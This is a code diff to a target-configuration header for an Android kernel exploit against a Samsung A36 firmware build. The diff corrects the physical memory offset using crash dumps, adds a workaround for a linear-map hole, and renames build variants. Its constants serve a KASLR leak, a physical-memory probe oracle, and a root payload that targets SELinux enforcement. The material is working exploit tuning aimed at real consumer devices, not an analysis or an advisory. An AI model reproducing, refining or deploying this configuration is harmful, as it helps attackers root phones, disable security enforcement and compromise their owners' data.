@@ -14,17 +14,23 @@
  * SLIDE_NFULNL_LOGGER_NAME and SLIDE_NFULNL_LOGGER_OBJECT confirmed
  *   via direct ELF data read.
  * SELINUX_ENFORCING points to selinux_state.enforcing (first field).
- * P0_PHYS_OFFSET 0x0 = memstart_addr (RAM at phys 0). Inferred from the first
- *   on-device slide-only run: the probe (old P0_PHYS_OFFSET 0x80000000) read
- *   a ZEROED page at linear 0xffffff8000270000 (pfn 0x270) without faulting,
- *   so phys 0x270000 is mapped => memstart cannot be 0x80000000 (that would put
- *   the probe below the linear-map base and oops). Gate passed with the same
- *   constants as e3q, pinning PAGE_OFFSET - memstart = DIRECT_MAP_BASE.
+ * P0_PHYS_OFFSET 0x80000000 = memstart_addr (RAM base at phys 0x80000000),
+ *   matching the A36 kernel boot print "PHYS_OFFSET: 0x80000000"
+ *   (dumpstate_lastkmsg_9:15418) and the e3q/S928U1 constants exactly.
+ *   With the old 0x0 the p0-oracle PROBE parent
+ *   (P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + P0_ORACLE_PROBE_OFFSET)
+ *   computed to linear 0xffffff8080270000 -> vmemmap slot 0x80270
+ *   (VA 0xfffffffe02009c00), which is NOT populated in this kernel (that
+ *   phys window is not RAM) -> level-2 translation fault at 0xfffffffe02009c10,
+ *   seen in BOTH RWC=8 and RWC=9 dumps (pc: rb_erase+0x94, pmd=0).
+ *   With 0x80000000 the probe parent becomes slot 0x270
+ *   (vmemmap 0xfffffffe00009c00) and P0_KERNEL_PHYS_DELTA = 0x80000,
+ *   identical to e3q-S928USQS6DZF2, which works. The earlier "memstart=0"
+ *   conclusion from the first-run zeroed probe page was wrong.
  * P0_KERNEL_PHYS_LOAD 0x80080000 = loader region base 0x80000000 + 0x00080000,
  *   matching the A36 LinuxLoader ARM64 load constants read at .rdata
  *   0xf2954 (0x00080000) / 0xf2958 (0x05600000) in BootLinux (sub_0x7BCC),
  *   identical to the S928U1/e3q values (see docs/SM-S928U1-S928U1UES6DZF2.md).
- *   Probe at 0x80000+0x1f0000 was zeroed, so the kernel is NOT at phys 0x80000;
  *   0x80080000 remains the best guess. If the device panics, try 0xa8000000.
  *
  * A36 verification sources (all from the A366BXXSACZF1 kernel itself):
@@ -45,10 +51,10 @@
  */
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL "a36-parrotp-A366BXXSACZF1-app-physical-p0-oracle"
+#define BUILD_VARIANT_LABEL "parrotp-A366BXXSACZF1-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
 #else
-#define BUILD_VARIANT_LABEL "a36-parrotp-A366BXXSACZF1-root-umh"
+#define BUILD_VARIANT_LABEL "parrotp-A366BXXSACZF1-root-umh"
 #endif
 #ifndef BUILD_FINGERPRINT
 #define BUILD_FINGERPRINT \
@@ -58,9 +64,15 @@
 /* ===== KERNEL ADDRESS CONSTANTS ===== */
 #define KIMAGE_TEXT_BASE      0xffffffc080000000ULL
 #define P0_PAGE_OFFSET        0xffffff8000000000ULL
-#define P0_PHYS_OFFSET        0x0ULL                    /* memstart_addr=0 (RAM at phys 0): first on-device run probed a zeroed page at __va(pfn 0x270) WITHOUT faulting, which requires the low phys region to be mapped => memstart=0, not 0x80000000 */
+#define P0_PHYS_OFFSET        0x80000000ULL             /* memstart_addr (RAM base phys 0x80000000), matches boot print + e3q. Old 0x0 -> probe parent slot 0x80270 (vmemmap 0xfffffffe02009c00) unmapped -> fault; 0x80000000 -> slot 0x270 (mapped) */
 #define P0_KERNEL_PHYS_LOAD   0x80080000ULL             /* 0x80000000 + 0x80000 (LinuxLoader .rdata 0xf2954); GUESS: verify on device */
 #define SKB_DATA_DELTA        (-0xe80LL)                /* GUESS: try -0xe80 */
+/* A36 linear (direct) map has a pmd hole at phys 0x82600000-0x82800000
+ * (crash at ffffff80026ac360, rb_erase+0x8c via rt_mutex_adjust_pi), so
+ * slid linear aliases of late-.data targets (ashmem_misc @phys 0x826ac360,
+ * selinux_state @0x8270c598) are unmapped. data_addr() must use the kernel
+ * image VA (KIMAGE_TEXT_BASE + slide + off), which is always mapped. */
+#define P0_DATA_ADDR_AS_TEXT 1
 
 /* ===== KASLR LEAK PARAMETERS ===== */
 #define SLIDE_FAKE_WAITER_PRIO  0
@@ -112,7 +124,7 @@
 #define P0_ORACLE_GATE_OBJECT_INDEX    1
 #define P0_ORACLE_PROBE_OFFSET         0x1f0000ULL
 #define P0_FINGERPRINT_HEADER \
-  "targets/a36-parrotp-A366BXXSACZF1/p0_fingerprint.h"
+  "targets/parrotp-A366BXXSACZF1/p0_fingerprint.h"
 #endif
 
 /* ===== DIRECT MAP / VMEMMAP ===== */
